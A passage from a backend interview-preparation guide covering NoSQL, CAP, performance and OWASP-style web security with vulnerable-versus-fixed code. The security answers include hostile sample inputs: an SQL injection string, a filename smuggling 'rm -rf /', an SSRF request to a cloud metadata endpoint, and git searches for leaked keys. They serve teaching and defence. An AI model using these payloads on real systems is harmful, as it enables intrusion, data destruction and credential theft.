// Perfect for: sensor data, metrics, user activity logs, IoT

// ── Graph DB (Neo4j) — social network "friends of friends" ───────────
// Find all users who follow Alice and Bob but not Carol
// In SQL: complex multi-join query
// In Neo4j Cypher:
// MATCH (u:User)-[:FOLLOWS]->(alice:User {name: 'Alice'})
// MATCH (u)-[:FOLLOWS]->(bob:User {name: 'Bob'})
// WHERE NOT (u)-[:FOLLOWS]->(:User {name: 'Carol'})
// RETURN u.name
```

> 📖 Reference: [NoSQL Types — MongoDB](https://www.mongodb.com/nosql-explained)

---

**Q44. What is MongoDB? How does it store data differently from a relational database?**

**Answer:**

MongoDB is a document-oriented NoSQL database that stores data as **BSON** (Binary JSON) documents in collections. Unlike SQL's rigid rows and tables, documents are schema-flexible and can hold nested objects and arrays.

**Core differences:**

| | MongoDB | PostgreSQL |
|--|---------|-----------|
| Storage unit | Document (BSON) | Row |
| Grouping | Collection | Table |
| Schema | Flexible / schema-less | Fixed schema |
| Relationships | Embedded or referenced (manual joins) | Foreign keys + JOINs |
| Query language | MongoDB Query Language | SQL |

**Example — blog with comments:**

```js
// ── SQL approach — normalized, 2 tables, JOIN required ───────────────
// posts table: id, title, body, author_id, created_at
// comments table: id, post_id, author_name, body, created_at

// To get post with comments: SELECT ... JOIN ...

// ── MongoDB approach — embed comments in post document ───────────────
const post = {
  _id: ObjectId('64abc...'),
  title: 'Getting Started with MongoDB',
  body: 'MongoDB is a document database...',
  authorId: ObjectId('64def...'),
  tags: ['mongodb', 'database', 'nosql'],
  createdAt: new Date(),
  comments: [                          // embedded array — no JOIN needed
    {
      _id: ObjectId('64ghi...'),
      authorName: 'Alice',
      body: 'Great article!',
      createdAt: new Date(),
      likes: 5
    },
    {
      _id: ObjectId('64jkl...'),
      authorName: 'Bob',
      body: 'Very helpful, thanks!',
      createdAt: new Date(),
      likes: 2
    }
  ]
};

// CRUD operations
const db = client.db('blog');

// Create
await db.collection('posts').insertOne(post);

// Read with query
await db.collection('posts').find({
  tags: 'mongodb',                           // array contains
  createdAt: { $gte: new Date('2024-01-01') } // range query
}).sort({ createdAt: -1 }).limit(10).toArray();

// Update — add a comment
await db.collection('posts').updateOne(
  { _id: postId },
  { $push: { comments: newComment } }   // append to array
);

// Aggregation pipeline
await db.collection('posts').aggregate([
  { $match: { tags: 'mongodb' } },
  { $unwind: '$comments' },
  { $group: { _id: '$_id', commentCount: { $sum: 1 } } },
  { $sort: { commentCount: -1 } }
]);
```

> 📖 Reference: [MongoDB Introduction — MongoDB Docs](https://www.mongodb.com/docs/manual/introduction/)

---

**Q45. When would you choose a NoSQL database over a relational database?**

**Answer:**

Choose NoSQL when:

```
1. Schema changes frequently or is unpredictable
   → Document DB (MongoDB): product catalog with different specs per category
   → Each product has different attributes: laptops have RAM/CPU, shirts have size/color

2. Extreme write/read throughput (millions of ops/sec)
   → Cassandra, DynamoDB: IoT sensor data, click tracking, event logs

3. Data is naturally hierarchical/nested
   → MongoDB: user profiles with embedded addresses, preferences, history

4. Graph relationships are first-class
   → Neo4j: "who are friends of my friends who also like jazz?"

5. Simple key lookups with microsecond latency
   → Redis: session store, real-time leaderboards, rate limiting

6. Geographic distribution with high availability preferred over consistency
   → DynamoDB, Cassandra: global apps, CAP theorem trade-off (AP systems)
```

**Decision matrix:**

```
Use PostgreSQL/MySQL when:
✅ Complex relationships and JOINs
✅ ACID transactions are critical (payments, inventory)
✅ Schema is stable and well-defined
✅ Ad-hoc analytical queries
✅ Team knows SQL well

Use MongoDB when:
✅ Flexible/evolving schema (early-stage startup)
✅ Document-like data (product catalog, CMS, user profiles)
✅ Hierarchical data you'd embed rather than JOIN
✅ Rapid prototyping

Use Redis when:
✅ Caching, sessions, leaderboards
✅ Real-time pub/sub
✅ Temporary data with TTL

Use Cassandra/DynamoDB when:
✅ Massive write throughput (millions/sec)
✅ Time-series data
✅ Multi-region with high availability
✅ Predictable access patterns (by partition key)
```

> 📖 Reference: [SQL vs NoSQL — Datastax](https://www.datastax.com/blog/sql-vs-nosql)

---

**Q46. What is eventual consistency? How does it differ from strong consistency?**

**Answer:**

| | Strong Consistency | Eventual Consistency |
|--|-------------------|---------------------|
| Definition | Every read returns the most recent write | Reads may return stale data, but all nodes converge to same value eventually |
| Latency | Higher (waits for all replicas to confirm) | Lower (doesn't wait) |
| Availability | Lower (must wait for consensus) | Higher (can serve from any replica) |
| Examples | PostgreSQL, CockroachDB, Zookeeper | DNS, DynamoDB (default), Cassandra |

**Real-world illustration:**

```
Scenario: User changes their profile picture

Strong Consistency:
t=0:   User writes new avatar to DB
t=5ms: All 3 replicas updated
t=5ms: Any user fetching the profile sees NEW avatar ✅

Eventual Consistency:
t=0:   User writes to primary replica
t=0ms: User A immediately reads → sees NEW avatar (from primary) ✅
t=0ms: User B reads from replica 2 → sees OLD avatar (not yet synced) ⚠️
t=50ms: All replicas synced → now ALL users see NEW avatar ✅
→ "Eventually" consistent — all nodes will agree, but not immediately
```

**Code: reading from DynamoDB with consistency choice:**

```js
const { DynamoDBClient, GetItemCommand } = require('@aws-sdk/client-dynamodb');
const client = new DynamoDBClient({ region: 'us-east-1' });

// ✅ Eventually consistent read (default, cheaper, faster)
const result = await client.send(new GetItemCommand({
  TableName: 'Users',
  Key: { userId: { S: '42' } },
  ConsistentRead: false    // eventual consistency: may return slightly stale data
}));

// ✅ Strongly consistent read (more expensive, slower, always fresh)
const freshResult = await client.send(new GetItemCommand({
  TableName: 'Users',
  Key: { userId: { S: '42' } },
  ConsistentRead: true     // guaranteed to see latest write
}));
```

**When eventual consistency is acceptable:**
- Social media feeds, likes, view counts (off by a few seconds is fine).
- Product catalog, search results.
- DNS propagation.
- Recommendation systems.

**When you need strong consistency:**
- Bank balances, inventory counts, seat reservations.
- Any scenario where reading stale data causes a business problem.

> 📖 Reference: [Eventual Consistency — Werner Vogels](https://www.allthingsdistributed.com/2008/12/eventually_consistent.html)

---

**Q47. What is the CAP theorem? Explain CP vs AP systems with examples.**

**Answer:**

The **CAP theorem** states that a distributed system can guarantee at most **2 of 3** properties simultaneously during a network partition:

- **C (Consistency):** Every read returns the most recent write (or an error).
- **A (Availability):** Every request receives a response (not necessarily the latest data).
- **P (Partition Tolerance):** System continues operating despite network failures between nodes.

**Network partitions ALWAYS happen in distributed systems** — so you must always choose between **CP** or **AP**.

```
          C
         / \
        /   \
       /     \
      CA      CP
     /         \
    A --------- P
          AP

Real-world choice: C or A during partition?
```

**CP Systems (consistency over availability):**

```
Example: HBase, MongoDB (with write concern), ZooKeeper, Etcd

During network partition:
Node 1 ←— partition —→ Node 2

CP system: refuses to serve stale reads
→ Returns error: "Cannot ensure consistency — please retry later"
→ No stale data, but temporarily unavailable

Use case: Financial transactions, inventory management, distributed locks
"I'd rather fail than show wrong data"
```

**AP Systems (availability over consistency):**

```
Example: Cassandra, DynamoDB (default), CouchDB, DNS

During network partition:
Node 1 ←— partition —→ Node 2

AP system: serves data even if potentially stale
→ Returns best-effort data (might be old)
→ Always available, but may show stale data

Use case: Social media feeds, shopping carts, product catalog
"I'd rather show something than nothing"
```

**Practical example:**

```js
// Cassandra (AP) — will always respond, but data might be slightly stale
const cassandra = require('cassandra-driver');
const client = new cassandra.Client({ contactPoints: ['node1', 'node2', 'node3'] });

// ConsistencyLevel.ONE — fastest, most available, least consistent
await client.execute(
  'SELECT * FROM users WHERE id = ?',
  [userId],
  { consistency: cassandra.types.consistencies.one } // AP — fast, might be stale
);

// ConsistencyLevel.QUORUM — majority of nodes must agree (CP-like behavior)
await client.execute(
  'SELECT * FROM users WHERE id = ?',
  [userId],
  { consistency: cassandra.types.consistencies.quorum } // slower but consistent
);
```

> 📖 Reference: [CAP Theorem — IBM](https://www.ibm.com/topics/cap-theorem)

---

## 8. Web Security — Intermediate

---

**Q48. What is the OWASP Top 10? Name at least 5 items and explain them briefly.**

**Answer:**

The **OWASP Top 10** is the most authoritative list of critical web application security risks. Updated in 2021:

```
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)
```

**5 explained with examples:**

```js
// ── 1. Broken Access Control ─────────────────────────────────────────
// User can access/modify other users' data

// ❌ Vulnerable: user can access ANY order by guessing the ID
app.get('/orders/:id', requireAuth, async (req, res) => {
  const order = await Order.findById(req.params.id);
  res.json(order); // returns order regardless of who owns it
});

// ✅ Fixed: verify ownership
app.get('/orders/:id', requireAuth, async (req, res) => {
  const order = await Order.findOne({
    where: { id: req.params.id, userId: req.user.userId } // MUST match current user
  });
  if (!order) return res.status(404).json({ error: 'Order not found' });
  res.json(order);
});

// ── 2. Injection (SQL, NoSQL, Command) ───────────────────────────────
// ❌ SQL Injection
const query = `SELECT * FROM users WHERE name = '${req.body.name}'`;
// Attacker input: ' OR '1'='1 → returns all users!

// ✅ Fixed: parameterized queries
db.query('SELECT * FROM users WHERE name = ?', [req.body.name]);

// ❌ Command Injection
exec(`convert ${req.body.filename} output.jpg`); // filename = '; rm -rf /'

// ✅ Fixed: never pass user input to shell commands, use libraries
const sharp = require('sharp');
await sharp(sanitizedPath).resize(800, 600).toFile('output.jpg');

// ── 3. Cryptographic Failures ────────────────────────────────────────
// Sensitive data exposed due to weak/missing encryption

// ❌ Storing passwords in plaintext or MD5
await db.query('INSERT INTO users (password) VALUES (?)', [password]); // plaintext!
await db.query('INSERT INTO users (password) VALUES (MD5(?))', [password]); // MD5 broken!

// ✅ Fixed: bcrypt with high work factor
const hash = await bcrypt.hash(password, 12);

// ❌ Sending PII over HTTP
// ✅ Enforce HTTPS everywhere, use HSTS header:
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

// ── 5. Security Misconfiguration ────────────────────────────────────
// ❌ Default credentials, verbose error messages, open debug endpoints
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack }); // ❌ exposes internals!
});

// ✅ Fixed: sanitize error responses in production
app.use((err, req, res, next) => {
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error', requestId: req.id });
  } else {
    res.status(500).json({ error: err.message, stack: err.stack }); // ok in dev
  }
});

// ── 10. SSRF (Server-Side Request Forgery) ────────────────────────────
// ❌ Server fetches arbitrary URL from user input
app.get('/proxy', async (req, res) => {
  const response = await fetch(req.query.url); // attacker: http://169.254.169.254/latest/meta-data/
  res.send(await response.text());             // → AWS metadata endpoint! credentials leaked
});

// ✅ Fixed: whitelist allowed domains
const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.trusted.com'];
app.get('/proxy', async (req, res) => {
  const url = new URL(req.query.url);
  if (!ALLOWED_DOMAINS.includes(url.hostname)) {
    return res.status(403).json({ error: 'Domain not allowed' });
  }
  const response = await fetch(req.query.url);
  res.send(await response.text());
});
```

> 📖 Reference: [OWASP Top 10 — OWASP](https://owasp.org/www-project-top-ten/)

---

**Q49. What is a security header? Name 4 important HTTP security headers and their purpose.**

**Answer:**

Security headers are HTTP response headers that instruct browsers to enable security protections.

```js
// Set all security headers with helmet.js (recommended)
const helmet = require('helmet');
app.use(helmet()); // sets sensible defaults for all headers below

// ── Or configure individually: ────────────────────────────────────────

// 1. Content-Security-Policy (CSP)
// Prevents XSS by whitelisting allowed content sources
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],              // only load from same origin
    scriptSrc:  ["'self'", "cdn.jsdelivr.net"], // scripts from self + CDN only
    styleSrc:   ["'self'", "'unsafe-inline'"],
    imgSrc:     ["'self'", "data:", "*.cloudinary.com"],
    connectSrc: ["'self'", "api.myapp.com"],
    objectSrc:  ["'none'"],              // block <object>, <embed>, <applet>
    frameAncestors: ["'none'"],          // prevent clickjacking via iframes
  }
}));
// Browser: refuses to load scripts from evil.com even if injected via XSS ✅

// 2. Strict-Transport-Security (HSTS)
// Forces HTTPS — browser won't make HTTP requests to this domain
app.use(helmet.hsts({
  maxAge:            31536000,  // 1 year (in seconds)
  includeSubDomains: true,      // applies to all subdomains
  preload:           true       // submit to browser preload lists
}));
// Result: browser always uses HTTPS for this domain ✅

// 3. X-Frame-Options
// Prevents your site from being embedded in iframes (clickjacking defense)
app.use(helmet.frameguard({ action: 'deny' }));
// or 'sameorigin' to allow same-domain framing
// Response header: X-Frame-Options: DENY ✅

// 4. X-Content-Type-Options
// Prevents MIME type sniffing — browser uses declared Content-Type only
app.use(helmet.noSniff());
// Response header: X-Content-Type-Options: nosniff
// Prevents: serving a .jpg that's actually JavaScript from being executed ✅

// Other important ones:
// Referrer-Policy: controls how much referrer info is sent
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

// Permissions-Policy: restrict browser features
res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
```

**Quick reference:**

| Header | Protects against |
|--------|----------------|
| `Content-Security-Policy` | XSS, data injection |
| `Strict-Transport-Security` | Protocol downgrade attacks, cookie hijacking |
| `X-Frame-Options` | Clickjacking |
| `X-Content-Type-Options` | MIME sniffing |
| `Referrer-Policy` | Information leakage via Referer header |
| `Permissions-Policy` | Malicious use of browser features |

> 📖 Reference: [Security Headers — OWASP](https://owasp.org/www-project-secure-headers/)

---

**Q50. What is the principle of least privilege? How does it apply to backend systems?**

**Answer:**

**Least privilege** means every component (user, service, process) should have the **minimum permissions** needed to perform its function — nothing more.

**Applied to database access:**

```sql
-- ❌ App connects as superuser
-- postgresql.conf: host all postgres password md5
-- → App can DROP TABLE, ALTER SCHEMA, access all databases!

-- ✅ Create a dedicated limited user
CREATE USER myapp_api WITH PASSWORD 'secure-password';

-- Grant ONLY what the app needs
GRANT CONNECT ON DATABASE myapp TO myapp_api;
GRANT USAGE  ON SCHEMA public TO myapp_api;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO myapp_api;

-- Don't grant DROP, ALTER, TRUNCATE, CREATE TABLE
-- If attacker SQL-injects the app, they can't destroy the schema

-- Read-only reporting service
CREATE USER myapp_reporting WITH PASSWORD 'reporting-password';
GRANT CONNECT ON DATABASE myapp TO myapp_reporting;
GRANT USAGE   ON SCHEMA public TO myapp_reporting;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO myapp_reporting;
-- Reporting service can ONLY read — even if compromised, no data modification
```

**Applied to AWS IAM:**

```json
// ❌ App role with AdministratorAccess — can do ANYTHING
{ "Effect": "Allow", "Action": "*", "Resource": "*" }

// ✅ App role with minimal permissions for what it actually does
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::my-app-uploads/*"  // only this specific bucket
    },
    {
      "Effect": "Allow",
      "Action": ["ses:SendEmail"],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": ["sqs:SendMessage", "sqs:ReceiveMessage", "sqs:DeleteMessage"],
      "Resource": "arn:aws:sqs:us-east-1:123456789:my-app-queue"  // only this queue
    }
  ]
}
```

**Applied to application code:**

```js
// ❌ API endpoint doing too much
app.get('/orders', requireAuth, async (req, res) => {
  // Regular users should only see THEIR orders
  const orders = await db.query('SELECT * FROM orders'); // returns ALL orders!
});

// ✅ Scoped by caller's identity
app.get('/orders', requireAuth, async (req, res) => {
  const filter = req.user.role === 'admin'
    ? {}                                    // admins can see all
    : { where: { userId: req.user.userId } }; // users see only theirs

  const orders = await Order.findAll(filter);
  res.json(orders);
});
```

> 📖 Reference: [Least Privilege — OWASP](https://owasp.org/www-community/vulnerabilities/Least_Privilege_Violation)

---

**Q51. What is a secret manager? Why should you never store secrets in your codebase?**

**Answer:**

A **secret manager** is a secure, centralized service for storing, retrieving, rotating, and auditing sensitive credentials (API keys, DB passwords, certificates).

**Why never store secrets in code:**

```bash
# ❌ Committed to git — discovered by attackers within minutes via GitHub search
git grep "AKIA"          # finds AWS access keys
git grep "sk_live_"      # finds Stripe live keys
git log --all -p | grep "password"  # searches full git history

# ❌ These scenarios are common:
# - Developer accidentally pushes .env file
# - Secret in a config file committed without thinking
# - Secret in a log file committed as "logs for debugging"
# Even if you delete the file: git history NEVER forgets
```

**Secret manager examples:**

```js
// ── AWS Secrets Manager ───────────────────────────────────────────────
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');
const client = new SecretsManagerClient({ region: 'us-east-1' });

async function getSecret(secretName) {
  const { SecretString } = await client.send(
    new GetSecretValueCommand({ SecretId: secretName })
  );
  return JSON.parse(SecretString);
}

// At startup: fetch secrets from AWS
const dbCredentials = await getSecret('myapp/production/database');
// Returns: { host: 'prod-db.xyz', user: 'app', password: 'random-generated-pass' }

const pool = new Pool({
  host:     dbCredentials.host,
  user:     dbCredentials.user,
  password: dbCredentials.password, // never hardcoded ✅
  database: 'myapp'
});

// ── HashiCorp Vault ────────────────────────────────────────────────────
const vault = require('node-vault')({ endpoint: 'https://vault.internal.company.com' });

const { data } = await vault.read('secret/myapp/stripe');
const stripeClient = new Stripe(data.secretKey); // fetched from Vault, not .env

// ── Benefits of secret managers ───────────────────────────────────────
// ✅ Automatic rotation: DB password rotated every 30 days without code changes
// ✅ Audit log: who accessed which secret, when
// ✅ Fine-grained access: prod service can only read prod secrets
// ✅ Encryption at rest and in transit
// ✅ No secrets in code, environment files, or logs
```

> 📖 Reference: [Secrets Management — AWS Secrets Manager](https://aws.amazon.com/secrets-manager/)

---

**Q52. What is dependency confusion / supply chain attack? How do you protect against it?**

**Answer:**

**Dependency Confusion** exploits the way package managers (npm, pip, etc.) resolve package names. If an internal package name matches a public package, the manager might install the public (malicious) one instead of the internal one.

**The attack (Alex Birsan's research, 2021):**

```
Company uses internal packages:
  @company/auth-lib (hosted on private registry at npm.company.com)
  @company/db-utils (also internal)

Attacker discovers internal package names (from job posts, error messages, config files)
Attacker publishes malicious packages to PUBLIC npm with the SAME names:
  @company/auth-lib  version 9.9.9 (higher than internal 1.2.0)
  @company/db-utils  version 9.9.9

npm's default behavior: public registry takes precedence for scoped packages
→ CI/CD installs ATTACKER's package instead of internal one
→ package.json postinstall script runs → attacker has code execution!
→ AWS credentials, environment variables exfiltrated
```

**How to protect your backend:**

```bash
# ── npm: configure scoped packages to internal registry ──────────────
# .npmrc
@company:registry=https://npm.company.internal/
# All @company/* packages ONLY come from internal registry

# ── Use exact package names with scope ────────────────────────────────
# package.json
{
  "dependencies": {
    "@company/auth-lib": "1.2.0"   # scoped → internal registry ✅
  }
}

# ── Lock file + integrity checking ────────────────────────────────────
# package-lock.json stores SHA-512 hashes of each package
# npm ci validates hashes on install → any tampered package fails

# ── Private packages: publish internal names to npm to "claim" them ───
# Even if the package does nothing, it prevents attackers from uploading
# with higher version numbers

# ── Audit regularly ────────────────────────────────────────────────────
npm audit                           # check for known vulnerabilities
npx snyk test                       # deeper supply chain analysis
```

```js
// ── Verify package integrity in CI ──────────────────────────────────
// GitHub Actions
steps:
  - name: Install dependencies
    run: npm ci  # uses package-lock.json — fails if integrity mismatch

  - name: Security audit
    run: npm audit --audit-level=high

  - name: SBOM generation (Software Bill of Materials)
    run: npx @cyclonedx/cyclonedx-npm --output-file sbom.json
    # Lists every dependency — reviewable by security team
```

> 📖 Reference: [Dependency Confusion — Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

---

## 9. Performance & Scalability Basics

---

**Q53. What is latency vs throughput? How do you measure them?**

**Answer:**

- **Latency:** Time for a single operation to complete (response time for one request). Measured in ms.
- **Throughput:** Number of operations completed per unit of time (requests per second). Measured in req/sec, TPS.

**They're not the same — and often trade off against each other:**

```
Example: Processing 1000 requests
Low latency + low throughput: each request takes 1ms, but only 1 at a time → 1000ms total
High throughput + acceptable latency: 100 parallel, each 10ms → 100ms total
```

**Measuring with tools:**

```bash
# ── k6 load test ──────────────────────────────────────────────────────
# k6 script (script.js)
import http from 'k6/http';
import { check, sleep } from 'k6';

export let options = {
  vus:      100,           // 100 virtual users (concurrent)
  duration: '30s',
  thresholds: {
    http_req_duration: ['p(95)<200'],  // 95% of requests under 200ms
    http_req_failed:   ['rate<0.01'],  // error rate under 1%
  }
};

export default function() {
  const res = http.get('https://api.myapp.com/users');
  check(res, { 'status 200': r => r.status === 200 });
  sleep(1);
}

# Run:
k6 run script.js

# Output:
# http_req_duration: avg=45.2ms  min=12ms  med=38ms  max=892ms  p(90)=82ms  p(95)=120ms  p(99)=340ms
# http_reqs:         1523 req/s
# http_req_failed:   0.02%
```

```bash
# ── Apache Bench (quick test) ─────────────────────────────────────────
ab -n 1000 -c 100 https://api.myapp.com/health
# -n 1000: 1000 total requests
# -c 100: 100 concurrent

# Output:
# Requests per second:    892.34 [#/sec]       ← throughput
# Time per request:       112.06 [ms] (mean)    ← latency (avg)
# Time per request:       1.121 [ms] (mean, across all concurrent)
# Transfer rate:          245.67 [Kbytes/sec]
```

**Metrics to track in production:**

```js
// In Prometheus/Grafana, track:
// • http_request_duration_seconds (histogram) → p50, p95, p99 latency
// • http_requests_total (counter) → requests per second
// • error_rate = http_requests_total{status=~"5.."} / http_requests_total
```

> 📖 Reference: [Latency vs Throughput — AWS](https://aws.amazon.com/compare/the-difference-between-throughput-and-latency/)

---

**Q54. What is a load balancer? What is the difference between round-robin and least-connections algorithms?**

**Answer:**

A **load balancer** distributes incoming requests across multiple backend server instances, preventing any one server from being overwhelmed.

```
Without LB:           With LB:
                       ┌──────────────────┐
Client ──────► Server  │   Load Balancer  │──► Server 1 (30% load)
(all traffic on one)   │   :443/:80       │──► Server 2 (35% load)
                       └──────────────────┘──► Server 3 (35% load)
```

**Load balancing algorithms:**

```
Round-Robin: Requests go to servers in rotation (1→2→3→1→2→3→...)
  Request 1 → Server 1
  Request 2 → Server 2
  Request 3 → Server 3
  Request 4 → Server 1 (back to start)

Problem: All requests treated as equal — but some take 10ms, others take 5 seconds
         Server 1 might be processing a slow request while Server 2 is idle

Least-Connections: Route to server with fewest active connections
  Server 1: 10 active connections
  Server 2: 2 active connections  ← next request goes here
  Server 3: 7 active connections
  Better for heterogeneous request durations ✅

IP Hash: Same client IP always goes to same server (session affinity)
  Good for: stateful sessions (when you can't use Redis for session state)

Weighted Round-Robin: Servers get traffic proportional to their weight
  Server 1 (weight=3): gets 3x requests (more powerful machine)
  Server 2 (weight=1): gets 1x requests
```

**NGINX load balancer config:**

```nginx
upstream backend {
  least_conn;                        # algorithm: least connections

  server app1.internal:3000 weight=3; # 3x traffic (more powerful)
  server app2.internal:3000 weight=1;
  server app3.internal:3000 weight=1;

  keepalive 32;                      # reuse connections to backend
}

server {
  listen 80;

  location / {
    proxy_pass http://backend;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

    # Health check — remove dead servers
    proxy_next_upstream error timeout;
    proxy_connect_timeout 1s;
    proxy_read_timeout 10s;
  }

  # Health check endpoint (NGINX Plus)
  location /health {
    health_check interval=5s fails=2 passes=2 uri=/health;
  }
}
```

> 📖 Reference: [Load Balancing — NGINX](https://www.nginx.com/resources/glossary/load-balancing/)

---

**Q55. What is connection keep-alive? How does it improve HTTP performance?**

**Answer:**

**HTTP Keep-Alive** (persistent connections) reuses the same TCP connection for multiple HTTP requests instead of opening a new connection for each one.

**Why TCP connection setup is expensive:**

```
Without Keep-Alive (HTTP/1.0):
Request 1: TCP SYN → SYN-ACK → ACK → HTTP GET → Response → FIN/ACK  (~50ms)
Request 2: TCP SYN → SYN-ACK → ACK → HTTP GET → Response → FIN/ACK  (~50ms)
Request 3: TCP SYN → SYN-ACK → ACK → HTTP GET → Response → FIN/ACK  (~50ms)
Total: 3 × 50ms = 150ms

With Keep-Alive (HTTP/1.1 default):
TCP SYN → SYN-ACK → ACK            (one-time TCP setup: ~15ms)
Request 1: HTTP GET → Response      (~5ms)
Request 2: HTTP GET → Response      (~5ms)  ← reuses same connection
Request 3: HTTP GET → Response      (~5ms)
Total: 15ms + 3 × 5ms = 30ms  ← 5x faster!
```

```js
// ── Node.js HTTP server keep-alive ────────────────────────────────────
const http = require('http');
const server = http.createServer(app);

server.keepAliveTimeout = 65000;  // 65 seconds (longer than AWS ALB's 60s timeout)
server.headersTimeout  = 66000;   // slightly longer than keepAliveTimeout

// ── Axios: reuse connections with HTTP Agent ──────────────────────────
const https = require('https');
const axios  = require('axios');

const httpsAgent = new https.Agent({
  keepAlive:    true,
  maxSockets:   100,     // max concurrent connections
  maxFreeSockets: 10,    // keep 10 idle connections ready
  timeout:      60000,   // idle timeout
});

const apiClient = axios.create({
  httpsAgent,            // reuse TCP connections across requests
  baseURL: 'https://api.partner.com'
});

// Without this: each axios.get() opens a NEW TCP connection → slow
// With this: connections are reused → much faster for many requests

// ── Response headers ──────────────────────────────────────────────────
// HTTP/1.1: keep-alive is default, must opt-out with Connection: close
// HTTP/2: multiplexing makes keep-alive implicit (multiple streams, 1 connection)

// Check with curl:
// curl -v https://api.myapp.com/health
// < Connection: keep-alive
// < Keep-Alive: timeout=65
```

> 📖 Reference: [HTTP Keep-Alive — MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Keep-Alive)

---

**Q56. What is database read replica? When and why would you use one?**

**Answer:**

A **read replica** is a copy of the primary database that receives all writes replicated from the primary and can serve read queries. Writes always go to the primary; reads can go to any replica.

```
Without read replica:
All queries → Primary DB → overloaded → slow

With read replica:
Writes → Primary DB → replicates to →  Replica 1
Reads  →                                Replica 2
                                         Replica 3
→ Primary handles writes only, replicas share read load
```

**When to use:**

```js
// ── Use case 1: Read-heavy workload (e.g., 90% reads, 10% writes) ────
// Route heavy read queries to replica
const primaryPool  = new Pool({ host: process.env.DB_PRIMARY_HOST });
const replicaPool  = new Pool({ host: process.env.DB_REPLICA_HOST });

// Write to primary
async function createUser(data) {
  return primaryPool.query('INSERT INTO users ... RETURNING *', [data]);
}

// Read from replica (slight staleness acceptable)
async function getUserById(id) {
  return replicaPool.query('SELECT * FROM users WHERE id = $1', [id]);
}

// ── Use case 2: Expensive analytics queries ───────────────────────────
// Run heavy reports on replica — doesn't slow down production traffic
async function generateMonthlyReport() {
  return replicaPool.query(`
    SELECT u.name, SUM(o.total) as revenue, COUNT(o.id) as order_count
    FROM users u JOIN orders o ON u.id = o.user_id
    WHERE o.created_at >= date_trunc('month', NOW())
    GROUP BY u.id ORDER BY revenue DESC
    LIMIT 100
  `); // runs on replica — primary completely unaffected ✅
}

// ── Caveat: replication lag ─────────────────────────────────────────
// Replicas are slightly behind primary (typically 0-100ms)
// AFTER writing, immediately reading may return stale data

// ❌ Potential race condition
const user = await createUser(data);
const fetched = await getUserById(user.id); // might not yet be on replica!

// ✅ Read-your-own-writes: use primary for reads immediately after writes
async function registerUser(data) {
  const user = await createUser(data); // write to primary
  return primaryPool.query(             // read from PRIMARY for consistency
    'SELECT * FROM users WHERE id = $1', [user.id]
  );
}
```

**AWS RDS Read Replica setup:**

```yaml
# Terraform example
resource "aws_db_instance" "primary" {
  identifier     = "myapp-primary"
  engine         = "postgres"
  instance_class = "db.r6g.xlarge"
  multi_az       = true  # high availability
}

resource "aws_db_instance" "replica" {
  identifier          = "myapp-replica-1"
  replicate_source_db = aws_db_instance.primary.identifier
  instance_class      = "db.r6g.large"  # can be smaller if only reads
}
```

> 📖 Reference: [Read Replicas — AWS RDS Docs](https://aws.amazon.com/rds/features/read-replicas/)

---

**Q57. What is a flame graph? How is it used to profile backend performance?**

**Answer:**

A **flame graph** is a visualization of a performance profile — it shows where CPU time is spent across the call stack. Wide boxes = more time spent. The call stack grows upward (bottom = entry point, top = deepest call).

```
How to read a flame graph:
y-axis: call depth (top = deepest function call)
x-axis: percentage of total time (width = % of CPU time)
Color:  random (for visual distinction) — not meaningful

          ┌───[handleRequest 3%]──┐
          └──────────────────────┘
     ┌────────[db.query 8%]────────────────────────────┐
     └────────────────────────────────────────────────┘
┌─────────────────────[processOrder 25%]────────────────────────────────────────────┐
└────────────────────────────────────────────────────────────────────────────────────┘

→ processOrder takes 25% of CPU time → this is the hotspot to optimize!
```

**Generating a flame graph for Node.js:**

```bash
# ── Method 1: clinic.js (easiest) ────────────────────────────────────
npm install -g clinic
clinic flame -- node app.js
# Runs app, samples CPU, generates interactive flame graph in browser
# Open: .clinic/12345.clinic-flame/index.html

# ── Method 2: 0x (focused on Node.js) ────────────────────────────────
npm install -g 0x
0x -- node app.js
# Send load to your app:
ab -n 5000 -c 50 http://localhost:3000/api/orders
# Press Ctrl+C → generates flamegraph.html

# ── Method 3: Node.js built-in profiler ──────────────────────────────
node --prof app.js         # generate isolate-*.log file
node --prof-process isolate-0xNN.log > profile.txt
# Then use d8 or flamebearer to visualize
```

**Reading a real flame graph:**

```
Wide stack at top = CPU hotspot

Example flame graph analysis:
┌─────────────────────────────────────[serialize JSON 45%]──────────────────────────┐
└───────────────────────────────────────────────────────────────────────────────────┘

Finding: JSON.stringify() of huge objects is taking 45% of CPU time!

Fix: 
1. Reduce object size before serializing
2. Use faster JSON libraries (fast-json-stringify with schema)
3. Cache serialized responses

Result after fix: JSON serialization drops to 8% → 5x faster endpoint ✅
```

> 📖 Reference: [Flame Graphs — Brendan Gregg](https://www.brendangregg.com/flamegraphs.html)

---

## 10. Software Architecture Patterns

---

**Q58. What is the Layered (N-Tier) Architecture? What are the typical layers in a backend app?**

**Answer:**

**Layered architecture** organizes code into horizontal layers where each layer has a specific responsibility and only communicates with the layer directly below it.

**Typical 4-layer backend structure:**

```
┌─────────────────────────────────────────────────────────┐
│  Presentation Layer  (HTTP, routes, controllers)         │
│  Handles: request parsing, response formatting, routing  │
├─────────────────────────────────────────────────────────┤
│  Business Logic Layer  (services, use cases)             │
